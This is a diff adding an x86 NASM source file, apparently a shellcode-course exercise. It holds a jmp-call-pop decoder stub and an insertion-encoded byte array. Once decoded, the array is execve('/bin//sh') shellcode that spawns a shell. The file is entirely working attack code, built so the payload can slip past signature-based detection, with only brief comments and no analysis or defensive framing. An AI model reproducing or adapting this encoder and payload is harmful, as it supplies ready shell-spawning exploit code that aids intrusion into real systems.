@@ -1,0 +1,41 @@
+; file: encoder.nasm
+; Author: mariuszha
+
+global _start
+
+section .text
+
+_start:
+
+	jmp short call_shellcode
+
+
+decoder:
+
+	pop esi ; to get address of encoded shellcode
+
+	lea edi, [esi +1] ; points to the first 0xaa of the encoded shellcode
+	xor eax, eax
+	mov al, 1 ; points to the frist element of the encoded shellcode
+	xor ebx, ebx
+	xor edx, edx ; zreaoing edx register for our insertion encode
+	mov dl, 0xaa ; move 0xaa value as a first value, letter we will increament it
+
+decode:
+	
+	mov bl, [esi +eax] ; this move address of 0xaa to the ebx register
+	xor bl, dl
+	jnz short EncodedShellcode
+	mov bl, byte [esi + eax +1]
+	mov byte [edi], bl
+	inc edi
+	add al, 2
+	inc dl ; increament edx register by 1 to fullfil the pattern from encoding process
+	jmp short decode
+
+
+call_shellcode:
+
+	call decoder
+
+	EncodedShellcode: db 0x31,0xaa,0xc0,0xab,0x50,0xac,0x68,0xad,0x6e,0xae,0x2f,0xaf,0x73,0xb0,0x68,0xb1,0x68,0xb2,0x2f,0xb3,0x2f,0xb4,0x62,0xb5,0x69,0xb6,0x89,0xb7,0xe3,0xb8,0x50,0xb9,0x89,0xba,0xe2,0xbb,0x53,0xbc,0x89,0xbd,0xe1,0xbe,0xb0,0xbf,0x0b,0xc0,0xcd,0xc1,0x80,0xc2
